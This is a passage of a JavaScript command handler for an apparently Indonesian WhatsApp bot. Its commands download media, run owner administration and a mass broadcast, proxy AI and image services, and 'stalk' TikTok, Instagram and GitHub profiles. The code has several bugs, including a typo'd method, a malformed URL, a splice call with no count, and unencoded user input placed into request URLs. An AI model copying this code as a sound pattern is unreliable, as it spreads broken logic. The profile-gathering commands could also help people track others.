                   var req = await (await fetch(`https://api.xcodeteam.xyz/api/downloader/youtube-video?api_key=${setting.apikey.xcode}&video_url=${args[1]}`)).json()
                   var { code } = req
                   if ([400, 403, 404, 429, 500].includes(code)) return reply(mess.error.api)
                   var { title, thumb, channel, published, views, url } = req.data
                   var teks = `• *Title :* ${title}\n`
                   teks += `• *Channel :* ${channel}\n`
                   teks += `• *Published :* ${published}\n`
                   teks += `• *Views :* ${views}`
                   conn.sendMessage(from, { image: { url: thumb }, caption: teks }, { quoted: msg })
                   conn.sendMessage(from, { video: { url: url }}, { quoted: msg })
                   limitAdd(sender, limit)
                   break
             case 'ytmp3':
             case 'mp3':
                   if (isLimit(sender, isPremium, isCreator, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                   if (args.length < 2) return reply(`Kirim perintah ${command} link`)
                   if (!isUrl(args[1])) return reply(mess.error.Iv)
                   if (!args[1].includes('youtube')) return reply(mess.error.Iv)
                   conn.sendMessage(from, wait)
await sleep(600)
                   var req = await (await fetch(`https://api.xcodeteam.xyz/api/downloader/youtube-audio?api_key=${setting.apikey.xcode}&video_url=${args[1]}`)).json()
                   var { code } = req
                   if ([400, 403, 404, 429, 500].includes(code)) return reply(mess.error.api)
                   var { title, thumb, channel, published, views, url } = req.data
                   var teks = `• *Title :* ${title}\n`
                   teks += `• *Channel :* ${channel}\n`
                   teks += `• *Published :* ${published}\n`
                   teks += `• *Views :* ${views}`
                   conn.sendMessage(from, { image: { url: thumb }, caption: teks }, { quoted: msg })
                   conn.sendMessage(from, { audio: { url: url }, mimetype: 'audio/mp4' }, { quoted: msg })
                   limitAdd(sender, limit)
                   break
            case 'ytvideo':
             case 'video1':
                   if (!isPremium && !isOwner && !isCreator) return reply(mess.OnlyPrem)
                   if (args.length < 2) return reply(`Kirim perintah ${command} link`)
                   if (!isUrl(args[1])) return reply(mess.error.Iv)
                   if (!args[1].includes('youtu.be')) return reply(mess.error.Iv)
                   conn.sendMessage(from, wait)
await sleep(600)
                   var req = await (await fetch(`https://api.xcodeteam.xyz/api/downloader/youtube-video-v2?api_key=${setting.apikey.xcode}&video_url=${q}`)).json()
                   var { code } = req
                   if ([400, 403, 404, 429, 500].includes(code)) return reply(mess.error.api)
                   var { title, thumbnail, duration, vid_360p } = req.data
                   var teks = `• *Title :* ${title}\n`
                   teks += `• *Durasi :* ${duration}`
                   conn.sendMessage(from, { image: { url: thumbnail }, caption: teks }, { quoted: msg })
                   conn.sendMessage(from, { video: { url: vid_360p }}, { quoted: msg })
                   limitAdd(sender, limit)
                   break
             case 'ytaudio':
             case 'audio1':
                   if (isLimit(sender, isPremium, isCreator, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                   if (args.length < 2) return reply(`Kirim perintah ${command} link`)
                   if (!isUrl(args[1])) return reply(mess.error.Iv)
                   if (!args[1].includes('youtu.be')) return reply(mess.error.Iv)
                   conn.sendMessage(from, wait)
await sleep(600)
                   var req = await (await fetch(`https://api.xcodeteam.xyz/api/downloader/youtube-audio?api_key=${setting.apikey.xcode}&video_url=${args[1]}`)).json()
                   var { code } = req
                   if ([400, 403, 404, 429, 500].includes(code)) return reply(mess.error.api)
                   var { title, thumb, channel, published, views, url } = req.data
                   var teks = `• *Title :* ${title}\n`
                   teks += `• *Channel :* ${channel}\n`
                   teks += `• *Published :* ${published}\n`
                   teks += `• *Views :* ${views}`
                   conn.sendMessage(from, { image: { url: thumb }, caption: teks }, { quoted: msg })
                   conn.sendMessage(from, { audio: { url: url }, mimetype: 'audio/mp4' }, { quoted: msg })
                   limitAdd(sender, limit)
                   break
			// Owner Menu
			case 'exif':
			    if (!isOwner && !isCreator) return reply(mess.OnlyOwner)
			    if (args.length < 2) return reply(`Kirim perintah ${command} text1|text2`)
			    var namaPack = q.split('|')[0] ? q.split('|')[0] : q
                var authorPack = q.split('|')[1] ? q.split('|')[1] : ''
                exif.create(namaPack, authorPack)
				reply(`Sukses membuat exif`)
				break
			case 'leave':
			    if (!isOwner && !isCreator) return reply(mess.OnlyOwner)
				if (!isGroup) return reply(mess.OnlyGrup)
				conn.groupLeave(from)
			    break
			case 'jadibot': {
			   if (!isUser) return reply(`khusus private`)
               jadibot(conn, reply, msg, from)
               }
               break
            case 'jadibot1': {
            	if (args.length < 2) return reply(`Kirim perintah ${command} 62xxx`)
               jadibot1(conn, msg, q, from)
               }
               break
			case 'join':
			    if (!isOwner && !isCreator) return reply(mess.OnlyOwner)
				if (args.length < 2) return reply(`Kirim perintah ${command} _linkgrup_`)
				if (!isUrl(args[1])) return reply(mess.error.Iv)
				var url = args[1]
			    url = url.split('https://chat.whatsapp.com/')[1]
				var data = await conn.groupAcceptInvite(url)
				reply(jsonformat(data))
				break
		    case 'shutdown':
                if (!isOwner && !isCreator) return reply(mess.OnlyOwner)
                reply(`Successfully turned off the bot`)
                await sleep(3000)
                process.exit()
                break
            case 'addowner':
                if (!isCreator) return newReply(mess.OnlyOwner)
                if (args.length < 2) return reply(`Kirim Perintah ${command} 628`)
                let addown = m.mentionedJid ? m.mentionedJid : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                _owner.push(addown)
                     fs.writeFileSync('./database/owner.json', JSON.stringify(_owner, null, 2))                 
                reply(`Sukses menambahkan ke data`)
                break
            case 'delowner':
                if (!isCreator) return reply(mess.OnlyOwner)
                if (args.length < 2) return reply(`Kirim Perintah ${command} 628`)
                let delown = m.mentionedJid ? m.mentionedJid : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                let lal = _owner.indexOf(delown)
                     _owner.splice(lal)
                     fs.writeFileSync('./database/owner.json', JSON.stringify(_owner, null, 2))                   
                reply(`Sukses Menghapus di data`)
                break
            case 'autoread':
                if (!isCreator) return newReply(mess.OnlyOwner)
                if (args.length < 1) return reply(`Contoh ${command} on/off`)
                if (q === 'on') {
                    autoread = true
                    reply(`Berhasil mengubah autoread ke ${q}`)
                } else if (q === 'off') {
                    autoread = false
                    reply(`Berhasil mengubah autoread ke ${q}`)
                }
            break
            case 'autotyping':
                if (!isCreator) return reply(mess.OnlyOwner)
                if (args.length < 1) return reply(`Contoh ${command} on/off`)
                if (q === 'on') {
                    autotyping = true
                    reply(`Berhasil mengubah autotyping ke ${q}`)
                } else if (q === 'off') {
                    autotyping = false
                    reply(`Berhasil mengubah autotyping ke ${q}`)
                }
            break
            case 'autorecording':
                if (!isCreator) return reply(mess.OnlyOwner)
                if (args.length < 1) return reply(`Contoh ${command} on/off`)
                if (q === 'on') {
                    autorecording = true
                    reply(`Berhasil mengubah autorecording ke ${q}`)
                } else if (q === 'off') {
                    autorecording = false
                    reply(`Berhasil mengubah autorecording ke ${q}`)
                }
            break
            case 'setreply':
            case 'setreplay': {
               if (!isCreator) return reply(mess.OnlyOwner)
               if (!q) return reply(`setreply ada 4 tampilan`)
               if (q.startsWith('v')) {
                  typereply = q
                  reply(`done`)
               } else {
                  reply(`${q} tidak ada ditypereplay!`)
               }
            }
            break
            case 'setlistmenu':
            case 'setmenulist': {
               if (!isCreator) return reply(mess.OnlyOwner)
               if (!q) return reply(`set ada 5 tampilan`)
               if (q.startsWith('v')) {
                  typemenu1 = q
                  reply(`done`)
               } else {
                  reply(`${q} tidak ada ditypereplay!`)
               }
            }
            break            
		    case 'setnamabot': case 'setnamebot': {
			     if (!isCreator) return reply(`_Khusus Creator_`)
                 if (args.length < 2) return reply(`Kirim perintah ${command} _Nama akun wa_`)
                 let name = await conn.updateProfileName(q)
                 reply(`Successfully renamed bot to ${q}`)
                 }
                break
            case 'bc': case 'broadcast':
			    if (!isOwner && !isCreator) return reply(mess.OnlyOwner)
		        if (args.length < 2) return reply(`Masukkan isi pesannya`)
                var data = await store.chats.all().map(v => v.id)
                for (let i of data) {
                   conn.sendMessage(i, { text: `${q}\n\n_*BROADCAST MESSAGE*_` })
                   await sleep(1000)
                }
                break
			case 'mode':
                if (!isCreator) return reply(mess.OnlyOwner)
                if (args.length < 2) return reply(`Example ${command} public/self`)
                if (q == 'public') {
                    conn.mode = 'public'
                    conn.sendMessage(from, done)
await sleep(100)
                } else if (q == 'self') {
                    conn.mode = 'self'
                    conn.sendMessage(from, done)
await sleep(100)
                }
                break
			case 'addprem':
                if (!isOwner && !isCreator) return reply(mess.OnlyOwner)
                if (args.length < 2) return reply(`Penggunaan :\n*${prefix}addprem* @tag waktu\n*${prefix}addprem* nomor waktu\n\nContoh : ${command} @tag 30d`)
                if (!args[2]) return reply(`Mau yang berapa hari?`)
                if (mentioned.length !== 0) {
                    _prem.addPremiumUser(mentioned[0], args[2], premium)
                    reply('Sukses')
                } else {
                 var cekap = await conn.onWhatsApp(args[1]+"@s.whatsapp.net")
                 if (cekap.length == 0) return reply(`Masukkan nomer yang valid/terdaftar di WhatsApp`)
                    _prem.addPremiumUser(args[1] + '@s.whatsapp.net', args[2], premium)
                    reply('Sukses')
                }
                break
            case 'delprem':
                if (!isOwner && !isCreator) return reply(mess.OnlyOwner)
                if (args.length < 2) return reply(`Penggunaan :\n*${prefix}delprem* @tag\n*${prefix}delprem* nomor`)
                if (mentioned.length !== 0){
                    premium.splice(_prem.getPremiumPosition(mentioned[0], premium), 1)
                    fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
                    reply('Sukses!')
                } else {
                 var cekpr = await conn.oWhatsApp(args[1]+"@s.whatsapp.net")
                 if (cekpr.length == 0) return reply(`Masukkan nomer yang valid/terdaftar di WhatsApp`)
                    premium.splice(_prem.getPremiumPosition(args[1] + '@s.whatsapp.net', premium), 1)
                    fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
                    reply('Sukses!')
                }
                break
			// Random Menu
                case 'quote': case 'quotes':
                case 'randomquote': case 'randomquotes':
                   if (isLimit(sender, isPremium, isCreator, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                   var data = JSON.parse(fs.readFileSync('./database/quotes.json'))
                   data = pickRandom(data)
                   reply(data.quotes+'\n\n-- '+data.author)
                   limitAdd(sender, limit)
                   break
                case 'fakta': case 'randomfakta':
                   if (isLimit(sender, isPremium, isCreator, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                   var data = fs.readFileSync('./database/fakta.txt', 'utf-8').split('\n')
                   reply(pickRandom(data))
                   limitAdd(sender, limit)
                   break
                case 'quoteanime': case 'quotesanime':
                case 'animequotes': case 'animequote':
                   if (isLimit(sender, isPremium, isCreator, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                   require('../lib/quoteanime').quoteAnime().then( res => {
                     var data = pickRandom(res)
                     var teks = `${data.quote}\n\n- ${data.char_name}\nin *${data.anime_title}* eps *${data.at_ep}*`
                     reply(teks)
                     limitAdd(sender, limit)
                   }).catch((e) => reply(mess.error.api))
                   break
                case 'waifu':
                   if (isLimit(sender, isPremium, isCreator, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                   conn.sendMessage(from, wait)
await sleep(600)
                   var data = (await axios.get('https://waifu.pics/api/sfw/waifu')).data.url
                   conn.sendMessage(from, { caption: "Random Waifu", image: { url: data }}, { quoted: msg })
                   limitAdd(sender, limit)
                   break
             // nsfw menu
             case 'neko':
                if (!isUser) return reply(mess.OnlyPM)
                reply(`Dosa ditanggung oleh pengguna\nAgree`)
                conn.sendMessage(from, {
                    image: {
                        url: `https://zeltoria.site/api/random/neko`
                    }
                }, {
                    quoted: msg
                })
                break
            case 'remini':
            case 'hd':
            case 'tohd':
                 conn.sendMessage(from, wait)
await sleep(100)
                var media = await downloadAndSaveMediaMessage(msg, 'image', `./sticker/${sender+Date.now()}.jpg`)
                var hade = await TelegraPh(media)
                var anim = `https://skizo.tech/api/remini?url=${hade}&apikey=${apikey.skizo}`
                conn.sendMessage(from, {
                    image: {
                        url: anim
                    }
                }, {
                    quoted: msg
                })
                break
            case 'removebg':
            case 'nobg':
                 conn.sendMessage(from, wait)
await sleep(100)
                var media = await downloadAndSaveMediaMessage(msg, 'image', `./sticker/${sender+Date.now()}.jpg`)
                var bege = await TelegraPh(media)
                var req = await fetchJson(`https://aemt.me/removebg?url=${bege}`)              
                conn.sendMessage(from, {
                    image: {
                        url: req.url.result
                    }
                }, {
                    quoted: msg
                })
                break
            case 'pinterest': {
                if (!q) return reply(`Example : ${command} dafa`)
                conn.sendMessage(from, wait)
await sleep(100)
		        var ppin = `https://aemt.me/pinimg?query=${q}`
                conn.sendMessage(from, { image: { url: ppin }, caption: `_*Done*_ Bngk`}, { quoted: msg })
            }
            break
            case 'jadianime':
            case 'toanime':
                 conn.sendMessage(from, wait)
await sleep(100)
                var media = await downloadAndSaveMediaMessage(msg, 'image', `./sticker/${sender+Date.now()}.jpg`)
                let wtf = await TelegraPh(media)
                var anim = `https://skizo.tech/api/toanime?url=${wtf}&apikey=${apikey.skizo}`
                conn.sendMessage(from, {
                    image: {
                        url: anim
                    }
                }, {
                    quoted: msg
                }).catch(() => reply(mess.error.api))
                break
            // PhotoOxy Menu
            case 'flaming':
               if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
               if (args.length < 2) return reply(`Kirim perintah ${command} teks`)
               reply(mess.wait)
               getBuffer(`https://api.xcodeteam.xyz/api/photooxy/realistic-flaming-text-effect?api_key=${setting.apikey.xcode}&text=${q}`)
               .then( res => {
               	if (res === undefined) return reply(mess.error.api)
                   conn.sendMessage(from, { image: res }, { quoted: msg })
               	limitAdd(sender, limit)
               }).catch(() => reply(mess.error.api))
               break
            case 'night':
               if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
               if (args.length < 2) return reply(`Kirim perintah ${command} teks`)
               reply(mess.wait)
               getBuffer(`https://api.xcodeteam.xyz/api/photooxy/write-stars-text-on-the-night-sky?api_key=${setting.apikey.xcode}&text=${q}`)
               .then( res => {
               	if (res === undefined) return reply(mess.error.api)
                   conn.sendMessage(from, { image: res }, { quoted: msg })
               	limitAdd(sender, limit)
               }).catch(() => reply(mess.error.api))
               break
            case 'shadow':
               if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
               if (args.length < 2) return reply(`Kirim perintah ${command} teks`)
               reply(mess.wait)
               getBuffer(`https://api.xcodeteam.xyz/api/photooxy/shadow-text-effect-in-the-sky?api_key=${setting.apikey.xcode}&text=${q}`)
               .then( res => {
               	if (res === undefined) return reply(mess.error.api)
                   conn.sendMessage(from, { image: res }, { quoted: msg })
               	limitAdd(sender, limit)
               }).catch(() => reply(mess.error.api))
               break
            case 'paper':
               if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
               if (args.length < 2) return reply(`Kirim perintah ${command} teks`)
               reply(mess.wait)
               getBuffer(`https://api.xcodeteam.xyz/api/photooxy/write-text-on-burn-paper?api_key=${setting.apikey.xcode}&text=${q}`)
               .then( res => {
               	if (res === undefined) return reply(mess.error.api)
                   conn.sendMessage(from, { image: res }, { quoted: msg })
               	limitAdd(sender, limit)
               }).catch(() => reply(mess.error.api))
               break
            case 'grass':
               if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
               if (args.length < 2) return reply(`Kirim perintah ${command} teks`)
               reply(mess.wait)
               getBuffer(`https://api.xcodeteam.xyz/api/photooxy/make-quotes-under-grass?api_key=${setting.apikey.xcode}&text=${q}`)
               .then( res => {
               	if (res === undefined) return reply(mess.error.api)
                   conn.sendMessage(from, { image: res }, { quoted: msg })
               	limitAdd(sender, limit)
               }).catch(() => reply(mess.error.api))
               break
            case 'cube':
               if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
               if (args.length < 2) return reply(`Kirim perintah ${command} teks`)
               reply(mess.wait)
               getBuffer(`https://api.xcodeteam.xyz/api/photooxy/3d-text-effect-under-white-cube?api_key=${setting.apikey.xcode}text=${q}`)
               .then( res => {
               	if (res === undefined) return reply(mess.error.api)
                   conn.sendMessage(from, { image: res }, { quoted: msg })
               	limitAdd(sender, limit)
               }).catch(() => reply(mess.error.api))
               break
            case 'glow':
               if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
               if (args.length < 2) return reply(`Kirim perintah ${command} teks`)
               reply(mess.wait)
               getBuffer(`https://api.xcodeteam.xyz/api/photooxy/make-smoky-neon-glow-effect?api_key=${setting.apikey.xcode}&text=${q}`)
               .then( res => {
               	if (res === undefined) return reply(mess.error.api)
                   conn.sendMessage(from, { image: res }, { quoted: msg })
               	limitAdd(sender, limit)
               }).catch(() => reply(mess.error.api))
               break
            case 'rainbow':
               if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
               if (args.length < 2) return reply(`Kirim perintah ${command} teks`)
               reply(mess.wait)
               getBuffer(`https://api.xcodeteam.xyz/api/photooxy/rainbow-shine-text?api_key=${setting.apikey.xcode}&text=${q}`)
               .then( res => {
               	if (res === undefined) return reply(mess.error.api)
                   conn.sendMessage(from, { image: res }, { quoted: msg })
               	limitAdd(sender, limit)
               }).catch(() => reply(mess.error.api))
               break
            case 'fabric':
               if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
               if (args.length < 2) return reply(`Kirim perintah ${command} teks`)
               reply(mess.wait)
               getBuffer(`https://api.xcodeteam.xyz/api/photooxy/army-camouflage-fabric-text-effect?api_key=${setting.apikey.xcode}&text=${q}`)
               .then( res => {
               	if (res === undefined) return reply(mess.error.api)
                   conn.sendMessage(from, { image: res }, { quoted: msg })
               	limitAdd(sender, limit)
               }).catch(() => reply(mess.error.api))
               break
            case 'glowing':
               if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
               if (args.length < 2) return reply(`Kirim perintah ${command} teks`)
               reply(mess.wait)
               getBuffer(`https://api.xcodeteam.xyz/api/photooxy/create-a-3d-glowing-text-effect?api_key=${setting.apikey.xcode}&text=${q}`)
               .then( res => {
               	if (res === undefined) return reply(mess.error.api)
                   conn.sendMessage(from, { image: res }, { quoted: msg })
               	limitAdd(sender, limit)
               }).catch(() => reply(mess.error.api))
               break
            case 'honey':
               if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
               if (args.length < 2) return reply(`Kirim perintah ${command} teks`)
               reply(mess.wait)
               getBuffer(`https://api.xcodeteam.xyz/api/photooxy/honey-text-effect?api_key=${setting.apikey.xcode}&text=${q}`)
               .then( res => {
               	if (res === undefined) return reply(mess.error.api)
                   conn.sendMessage(from, { image: res }, { quoted: msg })
               	limitAdd(sender, limit)
               }).catch(() => reply(mess.error.api))
               break
            case 'vintage':
               if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
               if (args.length < 2) return reply(`Kirim perintah ${command} teks`)
               reply(mess.wait)
               getBuffer(`https://api.xcodeteam.xyz/api/photooxy/vintage-text-style?api_key=${setting.apikey.xcode}&text=${q}`)
               .then( res => {
               	if (res === undefined) return reply(mess.error.api)
                   conn.sendMessage(from, { image: res }, { quoted: msg })
               	limitAdd(sender, limit)
               }).catch(() => reply(mess.error.api))
               break
            case 'fur':
               if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
               if (args.length < 2) return reply(`Kirim perintah ${command} teks`)
               reply(mess.wait)
               getBuffer(`https://api.xcodeteam.xyz/api/photooxy/fur-text-effect-generator?api_key=${setting.apikey.xcode}&text=${q}`)
               .then( res => {
               	if (res === undefined) return reply(mess.error.api)
                   conn.sendMessage(from, { image: res }, { quoted: msg })
               	limitAdd(sender, limit)
               }).catch(() => reply(mess.error.api))
               break
            case 'striking':
               if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
               if (args.length < 2) return reply(`Kirim perintah ${command} teks`)
               reply(mess.wait)
               getBuffer(`https://api.xcodeteam.xyz/api/photooxy/striking-3d-text-effect?api_key=${setting.apikey.xcode}&text=${q}`)
               .then( res => {
               	if (res === undefined) return reply(mess.error.api)
                   conn.sendMessage(from, { image: res }, { quoted: msg })
               	limitAdd(sender, limit)
               }).catch(() => reply(mess.error.api))
               break
			// Search Menu
               case 'ytsearch': case 'yts':
                   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                   if (args.length < 2) return reply(`Kirim perintah ${command} query`)
                   conn.sendMessage(from, wait)
await sleep(600)
                   var req = await (await fetch(`https://api.xcodeteam.xyz/api/searcher/youtube?api_key=${setting.apikey.xcode}&video_title=${q}`)).json()
                   var { code } = req
                   if ([400, 403, 404, 429, 500].includes(code)) return reply(mess.error.api)
                   var no = 1
                   var teks = `*YOUTUBE SEARCH*\n\n`
                   for (let i of req.data) {
                   	var { url, title } = i
                       teks += `*(${no++})*\n`
                       teks += `• *Url :* ${url}\n`
                       teks += `• *Title :* ${title}\n\n`
                   }
                   reply(teks)
                   limitAdd(sender, limit)
                   break
               case 'lirik':
                   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                   if (args.length < 2) return reply(`Kirim perintah ${command} query`)
                   conn.sendMessage(from, wait)
await sleep(600)
                   var req = await (await fetch(`https://api.xcodeteam.xyz/api/searcher/lyrics?api_key=${setting.apikey.xcode}&song_title=${q}`)).json()
                   var { code } = req
                   if ([400, 403, 404, 429, 500].includes(code)) return reply(mess.error.api)
                   var { artist, lyrics } = req.data
                   var teks = `• *Artist :* ${artist}\n• *Lyrics :*\n${lyrics}`
                   reply(teks)
                   limitAdd(sender, limit)
                   break
               case 'txt2img': {
                if (args.length < 2) return reply(`Kirim perintah *${command}* cwe sange`)
                conn.sendMessage(from, wait)           
                conn.sendMessage(from, {
                    image: {
                    	url: `https://aemt.me/ai/text2img?text=${q}`}
                       }, { quoted: msg })
                   }
                   break  
               case 'openai':
               case 'gpt4':
               case 'ai': {
                if (args.length < 2) return reply(`Kirim perintah *${prefix}openai* question`)
                conn.sendMessage(from, wait)
await sleep(600)
                let d = await fetchJson(`https://aemt.me/gpt4?text=${q}`)                
                conn.sendMessage(from, {
                    text: d.result
                       }, { quoted: msg })
                   }
                   break
               case 'vanz': {
                if (args.length < 2) return reply(`Kirim perintah *${prefix}openai* question`)
                conn.sendMessage(from, wait)
                let a = `gunakan bahasa tidak formal`
                let d = await fetchJson(`https://aemt.me/gpt4?text=https://aemt.me/ai/c-ai?prompt=${a}&text=${q}`)                
                conn.sendMessage(from, {
                    text: d.result
                       }, { quoted: msg })
                   }
                   break
               case 'bard': {
                if (args.length < 2) return reply(`Kirim perintah *${prefix}bard* question`)
                conn.sendMessage(from, wait)
                let fak = await fetchJson(`https://api.xcodeteam.xyz/api/artificial-intelligence/bard?api_key=${setting.apikey.xcode}&question=${q}`)       
                conn.sendMessage(from, {
                    text: fak.data.answer
                       }, { quoted: msg })
                   }
                   break
               case 'tt1': {
                conn.sendMessage(from, wait)
await sleep(600)
                let fak = `test tag @${sender.split("@")[0]}`   
                conn.sendMessage(from, {
                    text: fak, mentions: [sender]
                       }, { quoted: msg })
                   }
                   break
               case 'chatty': {
                if (args.length < 2) return reply(`Kirim perintah *${prefix}chatty* question`)
                conn.sendMessage(from, wait)
await sleep(600)
                let asu = await fetchJson(`https://api.xcodeteam.xyz/api/artificial-intelligence/chatty-ai?api_key=${setting.apikey.xcode}&question=${q}`)       
                conn.sendMessage(from, {
                    text: asu.data.answer
                       }, { quoted: msg })
                   }
                   break
               case 'translate': {
                if (args.length < 2) return reply(`Kirim perintah *${prefix}translate* text|lang`)
                reply(mess.wait)
                var question = q.split("|")[0]
                var lang = q.split("|")[1]
                let f = await fetchJson(`https://zeltoria.site/api/tools/translate?q=${encodeURIComponent(question)}&lang=${encodeURIComponent(lang)}`)                
                conn.sendMessage(from, {
                    text: f.result
                       }, { quoted: msg })
                   }
                   break
               case 'kisahnabi':
                   if (args.length < 2) return reply(`Kirim perintah ${command} muhammad`)
                   conn.sendMessage(from, wait)
await sleep(100)
                   var req = await fetchJson(`https://api.zahwazein.xyz/islami/kisahnabi/${q}?apikey=${apikey.zein}`)
                   var { code } = req
                   if ([400, 403, 404, 429, 500].includes(code)) return reply(mess.error.api)
                   var { name, age, lahir, image, story } = req.result
                   var teks = `• *Nama :* ${name}\n`
                   teks += `• *Tahun Kelahiran :* ${lahir}\n`
                   teks += `• *Usia :* ${age}\n`
                   teks += `• *Deskripsi :* \n${story}`
                   conn.sendMessage(from, { image: { url: image }, caption: teks }, { quoted: msg })
                   break
               case 'jadwalsholat':
               case 'jadwalsolat':
               case 'jadwalsalat':
                   if (args.length < 2) return reply(`Kirim perintah ${command} muhammad`)
                   conn.sendMessage(from, wait)
await sleep(100)
                   var req = await fetchJson(`https://api.zahwazein.xyz/islami/jadwalshalat?kota=${encodeURIComponent(q)}&apikey=${apikey.zein}`)
                   var { code } = req
                   if ([400, 403, 404, 429, 500].includes(code)) return reply(mess.error.api)
                   var { tanggal, subuh, duha, zuhur, asar, magrib, isya} = req.result
                   var teks = `_*Jadwal Shalat daerah ${q}*_\n`
                   teks += `• *Tanggal :* ${tanggal}\n`
                   teks += `• *Duha :* ${duha}\n`
                   teks += `• *Zuhur :* ${zuhur}\n`
                   teks += `• *Asar :* ${asar}\n`
                   teks += `• *Magrib :* ${magrib}\n`
                   teks += `• *Isya:* ${isya}\n`
                   teks += `• *Subuh :* ${subuh}`
                   reply(teks)
                   break
               case 'tiktokstalk':
               case 'ttstalk':
                   if (args.length < 2) return reply(`Kirim perintah ${command} muhammad`)
                   conn.sendMessage(from, wait)
await sleep(600)
                   var req = await fetchJson(`https://api.lolhuman.xyz/api/stalktiktok/${encodeURIComponent(q)}?apikey=${setting.apikey.lol}`)
                   var { code } = req
                   if ([400, 403, 404, 429, 500].includes(code)) return reply(mess.error.api)
                   var { user_picture, username, nickname, bio, followers, followings, likes, video } = req.result
                   var teks = `• *Username :* ${username}\n`
                   teks += `• *Nickname :* ${nickname}\n`
                   teks += `• *Bio :* ${bio}\n`
                   teks += `• *Follower :* ${followers}\n`
                   teks += `• *Mengikuti :* ${followings}\n`
                   teks += `• *Likes :* ${likes}\n`
                   teks += `• *Video :* ${video}`
                   conn.sendMessage(from, { image: { url: user_picture }, caption: teks }, { quoted: msg })
                   break
               case 'githubstalk':
               case 'gitstalk':
                   if (args.length < 2) return reply(`Kirim perintah ${command} ManusiaTamvanzzz`)
                   conn.sendMessage(from, wait)
await sleep(600)
                   var req = await fetchJson(`https://api.github.com/users/${q}`)
                   var { login, name, followers, following, created_at, updated_at, public_gists, public_repos, twitter_username, bio, hireable, email, location,  blog, company, avatar_url, html_url } = req
                   var teks = `*User Name :* ${login}\n`
                    teks += `*Nick Name :* ${name}\n`
                    teks += `*Followers :* ${followers}\n`
                    teks += `*Following :* ${following}\n`
                    teks += `*Public Gists :* ${public_gists}\n`
                    teks += `*Public Repos :* ${public_repos}\n`
                    teks += `*Twitter :* ${twitter_username==null?'-':twitter_username}\n`
                    teks += `*Email :* ${email==null?'-':email}\n`
                    teks += `*Location :* ${location==null?'-':location}\n`
                    teks += `*Blog :* ${blog}\n`
                    teks += `*Link :* ${html_url}\n`
                    teks += `*Created Time :*\n- Date : ${moment(created_at).tz('Asia/Jakarta').format('DD-MM-YYYY')}\n- Time : ${moment(created_at).tz('Asia/Jakarta').format('HH:mm:ss')}\n`
                    teks += `*Updated Time :*\n- Date : ${moment(updated_at).tz('Asia/Jakarta').format('DD-MM-YYYY')}\n- Time : ${moment(updated_at).tz('Asia/Jakarta').format('HH:mm:ss')}\n`
                    teks += `*Bio :* ${bio}\n`
                   conn.sendMessage(from, { image: { url: avatar_url }, caption: teks }, { quoted: msg })
                   break
               case 'igstalk':
                   if (args.length < 2) return reply(`Kirim perintah ${command} username`)
                   conn.sendMessage(from, wait)
await sleep(600)
                   var req = await fetchJson(`https://api.lolhuman.xyz/api/stalkig/${encodeURIComponent(q)}?apikey=${setting.apikey.lol}`)
                   var { code } = req
                   if ([400, 403, 404, 429, 500].includes(code)) return reply(mess.error.api)
                   var { photo_profile, username, fullname, posts, followers, following, bio } = req.result
                   var teks = `• *Username :* ${username}\n`
                   teks += `• *Fullname :* ${fullname}\n`
                   teks += `• *Posts :* ${posts}\n`
                   teks += `• *Follower :* ${followers}\n`
                   teks += `• *Mengikuti :* ${following}\n`
                   teks += `• *Bio :* ${bio}`
                   conn.sendMessage(from, { image: { url: photo_profile }, caption: teks }, { quoted: msg })
                   break
               case 'ssweb':
                if (args.length < 2) return reply(`Kirim perintah *${prefix}ssweb* link`)
